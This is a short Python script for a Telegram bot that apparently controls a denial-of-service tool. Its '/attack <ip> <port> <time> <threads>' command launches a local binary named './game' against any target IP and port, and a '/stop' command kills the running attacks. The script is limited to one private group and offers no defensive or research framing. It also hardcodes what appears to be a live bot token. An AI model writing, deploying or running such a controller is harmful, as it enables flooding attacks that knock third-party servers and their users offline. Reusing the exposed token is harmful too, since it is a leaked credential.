from telegram.ext import Updater, CommandHandler
import subprocess
import os

TOKEN = '7821639514:AAH74HXLB2ap3IF1mwr5JEELzATQ_p7H3bU'
GROUP_ID = -4801647527  # Replace with your private group ID
BINARY_PATH = './game'
running = {}

def attack(update, context):
    if update.effective_chat.id != GROUP_ID:
        return

    if len(context.args) != 4:
        update.message.reply_text("Usage: /attack <ip> <port> <time> <threads>")
        return

    ip, port, time, threads = context.args
    cmd = [BINARY_PATH, ip, port, time, threads]

    try:
        process = subprocess.Popen(cmd)
        running[process.pid] = process
        update.message.reply_text(f"Attack started! : {process.pid}")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

def stop(update, context):
    if update.effective_chat.id != GROUP_ID:
        return

    if len(context.args) != 1:
        update.message.reply_text("Usage: /stop <pid>")
        return

    try:
        pid = int(context.args[0])
        if pid in running:
            running[pid].terminate()
            update.message.reply_text(f"Stopped attack with PID {pid}")
            del running[pid]
        else:
            update.message.reply_text("PID not found.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

updater = Updater(TOKEN, use_context=True)
dp = updater.dispatcher
dp.add_handler(CommandHandler("attack", attack))
dp.add_handler(CommandHandler("stop", stop))

updater.start_polling()
updater.idle()